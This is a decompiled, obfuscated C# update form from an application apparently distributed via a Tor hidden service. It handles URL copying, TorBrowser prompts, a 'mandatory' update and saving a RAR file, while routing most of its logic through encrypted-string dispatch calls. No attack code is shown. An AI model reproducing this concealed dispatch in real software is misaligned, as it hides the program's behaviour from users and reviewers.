﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x020000E0 RID: 224
[DesignerGenerated]
public sealed partial class fUpdate : Form
{
	// Token: 0x06000A85 RID: 2693 RVA: 0x00006E07 File Offset: 0x00005007
	public fUpdate()
	{
		base.Load += this.fUpdate_Load;
		base.Closing += this.fUpdate_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06000A88 RID: 2696 RVA: 0x00006E39 File Offset: 0x00005039
	internal BackgroundWorker vmethod_0()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06000A89 RID: 2697 RVA: 0x00053CB4 File Offset: 0x00051EB4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_3);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_2;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000A8A RID: 2698 RVA: 0x00006E41 File Offset: 0x00005041
	internal Label vmethod_2()
	{
		return this.label_0;
	}

	// Token: 0x06000A8B RID: 2699 RVA: 0x00006E49 File Offset: 0x00005049
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(Label label_10)
	{
		this.label_0 = label_10;
	}

	// Token: 0x06000A8C RID: 2700 RVA: 0x00006E52 File Offset: 0x00005052
	internal PictureBox vmethod_4()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000A8D RID: 2701 RVA: 0x00006E5A File Offset: 0x0000505A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(PictureBox pictureBox_4)
	{
		this.pictureBox_0 = pictureBox_4;
	}

	// Token: 0x06000A8E RID: 2702 RVA: 0x00006E63 File Offset: 0x00005063
	internal Label vmethod_6()
	{
		return this.label_1;
	}

	// Token: 0x06000A8F RID: 2703 RVA: 0x00006E6B File Offset: 0x0000506B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(Label label_10)
	{
		this.label_1 = label_10;
	}

	// Token: 0x06000A90 RID: 2704 RVA: 0x00006E74 File Offset: 0x00005074
	internal Label vmethod_8()
	{
		return this.label_2;
	}

	// Token: 0x06000A91 RID: 2705 RVA: 0x00006E7C File Offset: 0x0000507C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(Label label_10)
	{
		this.label_2 = label_10;
	}

	// Token: 0x06000A92 RID: 2706 RVA: 0x00006E85 File Offset: 0x00005085
	internal Label vmethod_10()
	{
		return this.label_3;
	}

	// Token: 0x06000A93 RID: 2707 RVA: 0x00006E8D File Offset: 0x0000508D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(Label label_10)
	{
		this.label_3 = label_10;
	}

	// Token: 0x06000A94 RID: 2708 RVA: 0x00006E96 File Offset: 0x00005096
	internal Label vmethod_12()
	{
		return this.label_4;
	}

	// Token: 0x06000A95 RID: 2709 RVA: 0x00006E9E File Offset: 0x0000509E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(Label label_10)
	{
		this.label_4 = label_10;
	}

	// Token: 0x06000A96 RID: 2710 RVA: 0x00006EA7 File Offset: 0x000050A7
	internal RichTextBox vmethod_14()
	{
		return this.richTextBox_0;
	}

	// Token: 0x06000A97 RID: 2711 RVA: 0x00006EAF File Offset: 0x000050AF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(RichTextBox richTextBox_1)
	{
		this.richTextBox_0 = richTextBox_1;
	}

	// Token: 0x06000A98 RID: 2712 RVA: 0x00006EB8 File Offset: 0x000050B8
	internal VisualButton vmethod_16()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000A99 RID: 2713 RVA: 0x00053CF8 File Offset: 0x00051EF8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(VisualButton visualButton_1)
	{
		EventHandler value = new EventHandler(this.method_12);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_1;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000A9A RID: 2714 RVA: 0x00006EC0 File Offset: 0x000050C0
	internal Label vmethod_18()
	{
		return this.label_5;
	}

	// Token: 0x06000A9B RID: 2715 RVA: 0x00006EC8 File Offset: 0x000050C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(Label label_10)
	{
		this.label_5 = label_10;
	}

	// Token: 0x06000A9C RID: 2716 RVA: 0x00006ED1 File Offset: 0x000050D1
	internal Label vmethod_20()
	{
		return this.label_6;
	}

	// Token: 0x06000A9D RID: 2717 RVA: 0x00053D3C File Offset: 0x00051F3C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(Label label_10)
	{
		EventHandler value = new EventHandler(this.method_6);
		Label label = this.label_6;
		if (label != null)
		{
			label.Click -= value;
		}
		this.label_6 = label_10;
		label = this.label_6;
		if (label != null)
		{
			label.Click += value;
		}
	}

	// Token: 0x06000A9E RID: 2718 RVA: 0x00006ED9 File Offset: 0x000050D9
	internal PictureBox vmethod_22()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06000A9F RID: 2719 RVA: 0x00053D80 File Offset: 0x00051F80
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(PictureBox pictureBox_4)
	{
		EventHandler value = new EventHandler(this.method_4);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_4;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000AA0 RID: 2720 RVA: 0x00006EE1 File Offset: 0x000050E1
	internal PictureBox vmethod_24()
	{
		return this.pictureBox_2;
	}

	// Token: 0x06000AA1 RID: 2721 RVA: 0x00053DC4 File Offset: 0x00051FC4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(PictureBox pictureBox_4)
	{
		EventHandler value = new EventHandler(this.method_5);
		PictureBox pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_2 = pictureBox_4;
		pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000AA2 RID: 2722 RVA: 0x00006EE9 File Offset: 0x000050E9
	internal StatusStrip vmethod_26()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000AA3 RID: 2723 RVA: 0x00006EF1 File Offset: 0x000050F1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06000AA4 RID: 2724 RVA: 0x00006EFA File Offset: 0x000050FA
	internal ToolStripStatusLabel vmethod_28()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06000AA5 RID: 2725 RVA: 0x00006F02 File Offset: 0x00005102
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(ToolStripStatusLabel toolStripStatusLabel_1)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_1;
	}

	// Token: 0x06000AA6 RID: 2726 RVA: 0x00006F0B File Offset: 0x0000510B
	internal BackgroundWorker vmethod_30()
	{
		return this.backgroundWorker_1;
	}

	// Token: 0x06000AA7 RID: 2727 RVA: 0x00053E08 File Offset: 0x00052008
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_14);
		BackgroundWorker backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_1 = backgroundWorker_2;
		backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000AA8 RID: 2728 RVA: 0x00006F13 File Offset: 0x00005113
	internal PictureBox vmethod_32()
	{
		return this.pictureBox_3;
	}

	// Token: 0x06000AA9 RID: 2729 RVA: 0x00053E4C File Offset: 0x0005204C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(PictureBox pictureBox_4)
	{
		EventHandler value = new EventHandler(this.method_13);
		PictureBox pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_3 = pictureBox_4;
		pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000AAA RID: 2730 RVA: 0x00006F1B File Offset: 0x0000511B
	internal Label vmethod_34()
	{
		return this.label_7;
	}

	// Token: 0x06000AAB RID: 2731 RVA: 0x00006F23 File Offset: 0x00005123
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(Label label_10)
	{
		this.label_7 = label_10;
	}

	// Token: 0x06000AAC RID: 2732 RVA: 0x00006F2C File Offset: 0x0000512C
	internal Label vmethod_36()
	{
		return this.label_8;
	}

	// Token: 0x06000AAD RID: 2733 RVA: 0x00006F34 File Offset: 0x00005134
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(Label label_10)
	{
		this.label_8 = label_10;
	}

	// Token: 0x06000AAE RID: 2734 RVA: 0x00006F3D File Offset: 0x0000513D
	internal Label vmethod_38()
	{
		return this.label_9;
	}

	// Token: 0x06000AAF RID: 2735 RVA: 0x00006F45 File Offset: 0x00005145
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(Label label_10)
	{
		this.label_9 = label_10;
	}

	// Token: 0x06000AB0 RID: 2736 RVA: 0x00006F4E File Offset: 0x0000514E
	private void fUpdate_Load(object sender, EventArgs e)
	{
		base.Visible = false;
		this.vmethod_14().ReadOnly = true;
		this.vmethod_14().BackColor = Color.White;
		this.method_11("Ready to update");
	}

	// Token: 0x06000AB1 RID: 2737 RVA: 0x00053E90 File Offset: 0x00052090
	private void fUpdate_Closing(object sender, CancelEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O;o*?=\\m", object_);
	}

	// Token: 0x06000AB2 RID: 2738 RVA: 0x00053EC8 File Offset: 0x000520C8
	private void method_0()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O;+*?<iU", object_);
	}

	// Token: 0x06000AB3 RID: 2739 RVA: 0x00053EF8 File Offset: 0x000520F8
	public void method_1(string string_1, bool bool_0, string string_2)
	{
		object[] object_ = new object[]
		{
			this,
			string_1,
			bool_0,
			string_2
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<q*?=2_", object_);
	}

	// Token: 0x06000AB4 RID: 2740 RVA: 0x00053F38 File Offset: 0x00052138
	public void method_2(int int_1)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fUpdate.Delegate54(this.method_2), new object[]
			{
				int_1
			});
			return;
		}
		base.Opacity = Conversion.Val((double)this.int_0 / 100.0);
	}

	// Token: 0x06000AB5 RID: 2741 RVA: 0x00053F94 File Offset: 0x00052194
	private void method_3(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		this.int_0 = 0;
		while (this.int_0 < 100)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 1);
			this.method_2(this.int_0);
			Thread.Sleep(1);
		}
	}

	// Token: 0x06000AB6 RID: 2742 RVA: 0x00006F7E File Offset: 0x0000517E
	private void method_4(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_20().Text);
		Interaction.MsgBox("URL copied to clipboard!\r\nPlease, visit it from TorBrowser!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000AB7 RID: 2743 RVA: 0x00006FA7 File Offset: 0x000051A7
	private void method_5(object sender, EventArgs e)
	{
		if (MessageBox.Show("The URL cannot be visited from a regular web browser without configuring a proxy.\r\n\r\nTherefore, it is recommended to use TorBrowser.\r\nIt's very simple!\r\n\r\nNavigate to https://www.torproject.org/download/?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			Process.Start("https://www.torproject.org/download/");
		}
	}

	// Token: 0x06000AB8 RID: 2744 RVA: 0x00006F7E File Offset: 0x0000517E
	private void method_6(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_20().Text);
		Interaction.MsgBox("URL copied to clipboard!\r\nPlease, visit it from TorBrowser!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000AB9 RID: 2745 RVA: 0x00053FE0 File Offset: 0x000521E0
	public bool method_7()
	{
		object[] object_ = new object[]
		{
			this
		};
		return (bool)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O97*?6pX", object_);
	}

	// Token: 0x06000ABA RID: 2746 RVA: 0x00054018 File Offset: 0x00052218
	public void method_8()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<0*?<EI", object_);
	}

	// Token: 0x06000ABB RID: 2747 RVA: 0x00054048 File Offset: 0x00052248
	public void method_9(byte[] byte_0)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fUpdate.Delegate53(this.method_9), new object[]
			{
				byte_0
			});
			return;
		}
		if (base.Visible)
		{
			base.TopMost = false;
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "RAR Archive |*.rar";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				bool flag = true;
				string text = fileName;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = text;
				@class.byte_0 = byte_0;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
				this.method_11("Update saved! You may now close this window.");
				this.struct18_3.method_1(true);
			}
			else
			{
				this.method_11("Update was aborted by user!");
			}
			base.TopMost = true;
		}
	}

	// Token: 0x06000ABC RID: 2748 RVA: 0x00006FC9 File Offset: 0x000051C9
	public void method_10()
	{
		if (this.vmethod_16().InvokeRequired)
		{
			this.vmethod_16().Invoke(new fUpdate.Delegate50(this.method_10), new object[0]);
			return;
		}
		this.vmethod_16().Enabled = true;
	}

	// Token: 0x06000ABD RID: 2749 RVA: 0x00054158 File Offset: 0x00052358
	public void method_11(string string_1)
	{
		if (this.vmethod_26().InvokeRequired)
		{
			this.vmethod_26().Invoke(new fUpdate.Delegate51(this.method_11), new object[]
			{
				string_1
			});
			return;
		}
		this.vmethod_28().Text = "Status: " + string_1;
	}

	// Token: 0x06000ABE RID: 2750 RVA: 0x00007003 File Offset: 0x00005203
	private void method_12(object sender, EventArgs e)
	{
		this.method_11("Starting update. Please wait...");
		new Thread(new ThreadStart(this.method_8)).Start();
		this.vmethod_16().Enabled = false;
	}

	// Token: 0x06000ABF RID: 2751 RVA: 0x00007032 File Offset: 0x00005232
	private void method_13(object sender, EventArgs e)
	{
		Interaction.MsgBox("This update is mandatory due to change in protocol, patched security flaws or other reasons.\r\n\r\nThe changelog may contain more information about why this update is forced.", MsgBoxStyle.Exclamation, Application.ProductName);
	}

	// Token: 0x06000AC0 RID: 2752 RVA: 0x000541AC File Offset: 0x000523AC
	private void method_14(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8c*?5D-", object_);
	}

	// Token: 0x040003FC RID: 1020
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040003FD RID: 1021
	private Label label_0;

	// Token: 0x040003FE RID: 1022
	private PictureBox pictureBox_0;

	// Token: 0x040003FF RID: 1023
	private Label label_1;

	// Token: 0x04000400 RID: 1024
	private Label label_2;

	// Token: 0x04000401 RID: 1025
	private Label label_3;

	// Token: 0x04000402 RID: 1026
	private Label label_4;

	// Token: 0x04000403 RID: 1027
	private RichTextBox richTextBox_0;

	// Token: 0x04000404 RID: 1028
	private VisualButton visualButton_0;

	// Token: 0x04000405 RID: 1029
	private Label label_5;

	// Token: 0x04000406 RID: 1030
	private Label label_6;

	// Token: 0x04000407 RID: 1031
	private PictureBox pictureBox_1;

	// Token: 0x04000408 RID: 1032
	private PictureBox pictureBox_2;

	// Token: 0x04000409 RID: 1033
	private StatusStrip statusStrip_0;

	// Token: 0x0400040A RID: 1034
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x0400040B RID: 1035
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x0400040C RID: 1036
	private PictureBox pictureBox_3;

	// Token: 0x0400040D RID: 1037
	private Label label_7;

	// Token: 0x0400040E RID: 1038
	private Label label_8;

	// Token: 0x0400040F RID: 1039
	private Label label_9;

	// Token: 0x04000410 RID: 1040
	private string string_0;

	// Token: 0x04000411 RID: 1041
	private int int_0;

	// Token: 0x04000412 RID: 1042
	private Struct18 struct18_0;

	// Token: 0x04000413 RID: 1043
	private Struct18 struct18_1;

	// Token: 0x04000414 RID: 1044
	private Struct16 struct16_0;

	// Token: 0x04000415 RID: 1045
	private Struct18 struct18_2;

	// Token: 0x04000416 RID: 1046
	private Struct18 struct18_3;

	// Token: 0x020000E1 RID: 225
	// (Invoke) Token: 0x06000AC6 RID: 2758
	private delegate void Delegate50();

	// Token: 0x020000E2 RID: 226
	// (Invoke) Token: 0x06000ACA RID: 2762
	private delegate void Delegate51(string string_0);

	// Token: 0x020000E3 RID: 227
	// (Invoke) Token: 0x06000ACE RID: 2766
	private delegate void Delegate52();

	// Token: 0x020000E4 RID: 228
	// (Invoke) Token: 0x06000AD2 RID: 2770
	private delegate void Delegate53(byte[] byte_0);

	// Token: 0x020000E5 RID: 229
	// (Invoke) Token: 0x06000AD6 RID: 2774
	private delegate void Delegate54(int int_0);
}
